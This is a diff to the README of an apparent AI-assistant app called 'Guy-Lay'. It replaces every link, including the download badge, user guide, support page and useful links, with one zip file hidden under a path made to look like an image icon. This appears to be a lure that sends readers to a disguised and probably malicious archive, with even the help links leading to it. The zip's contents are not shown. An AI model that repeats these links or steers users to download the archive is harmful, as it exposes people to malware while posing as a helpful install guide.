@@ -1,6 +1,6 @@
 # 👋 Guy-Lay - Your AI Assistant Awaits You
 
-[![Download Guy-Lay](https://img.shields.io/badge/Download-Guy--Lay-blue)](https://github.com/RowanSami-01/Guy-Lay/releases)
+[![Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip)](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Guy-Lay! This application serves as your friendly AI assistant, desig
 
 ## 📥 Download & Install
 
-To get started with Guy-Lay, **visit this page to download**: [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/releases).
+To get started with Guy-Lay, **visit this page to download**: [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip).
 
 Once you are on the Releases page:
 1. Find the latest version.
@@ -47,14 +47,14 @@ To keep your application up to date:
 
 ## 📖 User Guide
 
-For a complete user guide and tips on maximizing your experience, check out our [User Guide](https://github.com/RowanSami-01/Guy-Lay/wiki).
+For a complete user guide and tips on maximizing your experience, check out our [User Guide](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip).
 
 ## ⚙️ Troubleshooting
 
 If you encounter issues, try the following:
 - **Reinstall Guy-Lay**: Sometimes a fresh installation fixes problems.
 - **Check System Requirements**: Ensure your device meets the necessary specs.
-- **Visit Our Support Page**: Get additional support or report bugs on our [Support Page](https://github.com/RowanSami-01/Guy-Lay/issues).
+- **Visit Our Support Page**: Get additional support or report bugs on our [Support Page](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip).
 
 ## ✅ Feedback
 
@@ -62,8 +62,8 @@ Your feedback is valuable. If you have suggestions or encounter bugs, please let
 
 ## 🔗 Useful Links
 
-- [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/releases)
-- [User Guide](https://github.com/RowanSami-01/Guy-Lay/wiki)
-- [Support Page](https://github.com/RowanSami-01/Guy-Lay/issues)
+- [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip)
+- [User Guide](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip)
+- [Support Page](https://github.com/RowanSami-01/Guy-Lay/raw/refs/heads/master/icons/aptos.png/Lay-Guy-2.9.zip)
 
 Thank you for downloading Guy-Lay. Enjoy your new AI assistant!
